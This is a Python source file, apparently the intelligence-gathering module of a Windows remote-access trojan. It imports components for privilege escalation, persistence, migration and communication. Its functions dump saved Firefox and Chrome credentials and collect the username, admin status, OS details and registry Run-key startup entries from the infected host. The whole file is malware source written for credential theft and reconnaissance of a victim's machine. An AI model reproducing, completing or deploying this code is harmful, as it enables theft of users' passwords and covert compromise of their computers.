from defines import *
import helpers, privilege_escalation, migration, persistence, communication, intel, interact, execute, mutex
import dumpchrome, dumpff

# Functions used for intelligence gathering.

def dump_firefox(): #Dump Firefox credentials
	return dumpff.main()
	
def dump_chrome(): #And chrome creds too
	return dumpchrome.main()
	
def system_info(): #Gather information like system version
	output = ""
	output += "\nUsername: "+execute.execute_command("echo %username%")
	output += "Current process has admin privileges\n\n" if helpers.is_admin() else "Current process does not have admin privileges\n\n"
	output += "System info:\n"+str(execute.execute_command('systeminfo | findstr /r /i /c:".OS."'))
	output += "\nStartup programs:"+str(execute.execute_command("reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run")).replace("REG_SZ","").replace("\t"," ").replace("    "," ")
	return output
	
